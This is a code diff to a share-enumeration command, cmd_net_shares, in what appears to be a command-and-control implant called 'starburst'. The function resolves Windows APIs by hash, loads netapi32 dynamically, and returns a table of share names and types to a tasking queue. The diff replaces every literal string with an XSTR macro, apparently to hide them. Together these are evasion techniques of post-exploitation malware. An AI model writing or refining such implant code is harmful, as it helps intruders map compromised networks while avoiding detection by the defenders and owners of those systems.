@@ -29,7 +29,7 @@ auto declfn starburst::cmd_net_shares(
     auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
+            XSTR( "LoadLibrary netapi32 failed" ) );
         return;
     }
 
@@ -41,7 +41,7 @@ auto declfn starburst::cmd_net_shares(
             expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetShareEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -67,7 +67,7 @@ auto declfn starburst::cmd_net_shares(
 
     if ( status != 0 && status != 234 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NetShareEnum failed" ) ) );
+            XSTR( "NetShareEnum failed" ) );
         return;
     }
 
@@ -76,13 +76,12 @@ auto declfn starburst::cmd_net_shares(
     if ( !output ) {
         pNetApiBufferFree( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
 
-    str_copy( output + off, symbol<char*>( const_cast<char*>(
-        "Name\tType\tRemark\n" ) ) );
+    str_copy( output + off, XSTR("Name\tType\tRemark\n") );
     off = str_len( output );
 
     auto shares = reinterpret_cast<SHARE_INFO_1*>( buf );
@@ -103,28 +102,28 @@ auto declfn starburst::cmd_net_shares(
 
         switch ( base_type ) {
             case 0:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Disk" ) ) );
+                str_copy( output + off, XSTR( "Disk" ) );
                 off += 4;
                 break;
             case 1:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Print" ) ) );
+                str_copy( output + off, XSTR( "Print" ) );
                 off += 5;
                 break;
             case 2:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Device" ) ) );
+                str_copy( output + off, XSTR( "Device" ) );
                 off += 6;
                 break;
             case 3:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "IPC" ) ) );
+                str_copy( output + off, XSTR( "IPC" ) );
                 off += 3;
                 break;
             default:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Unknown" ) ) );
+                str_copy( output + off, XSTR( "Unknown" ) );
                 off += 7;
                 break;
         }
         if ( is_special ) {
-            str_copy( output + off, symbol<char*>( const_cast<char*>( " (Special)" ) ) );
+            str_copy( output + off, XSTR( " (Special)" ) );
             off += 10;
         }
         output[off++] = '\t';
